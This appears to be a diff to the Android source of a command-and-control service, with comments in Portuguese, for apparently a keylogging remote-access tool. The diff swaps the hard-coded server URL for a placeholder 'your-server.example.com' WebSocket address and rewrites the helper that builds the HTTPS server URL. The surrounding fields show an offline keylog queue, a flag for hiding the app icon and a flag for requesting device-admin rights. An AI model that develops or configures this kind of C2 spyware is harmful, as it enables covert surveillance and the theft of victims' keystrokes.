@@ -58,7 +58,7 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = "ws://192.168.1.14:5000/ws";
+    public static final String SERVER_URL = "wss://your-server.example.com/ws";
     public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
@@ -89,9 +89,28 @@ public class CommandControlService extends Service {
     private static final java.util.concurrent.ConcurrentLinkedQueue<String> offlineKeylogQueue = new java.util.concurrent.ConcurrentLinkedQueue<>();
     private static final int MAX_OFFLINE_KEYLOGS = 1000;
     
-    // Método auxiliar para obter URL HTTP do servidor
+    // Método auxiliar para obter URL HTTP do servidor — sempre retorna https://
     public static String getServerHttpUrl() {
-        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replace("/ws", "");
+        String url = SERVER_URL;
+        // Strip any known scheme prefix
+        if (url.startsWith("wss://")) {
+            url = url.substring("wss://".length());
+        } else if (url.startsWith("ws://")) {
+            url = url.substring("ws://".length());
+        } else if (url.startsWith("https://")) {
+            url = url.substring("https://".length());
+        } else if (url.startsWith("http://")) {
+            url = url.substring("http://".length());
+        }
+        // Strip trailing /ws path
+        if (url.endsWith("/ws")) {
+            url = url.substring(0, url.length() - 3);
+        }
+        // Strip trailing slash
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1);
+        }
+        return "https://" + url;
     }
     
     OkHttpClient client;
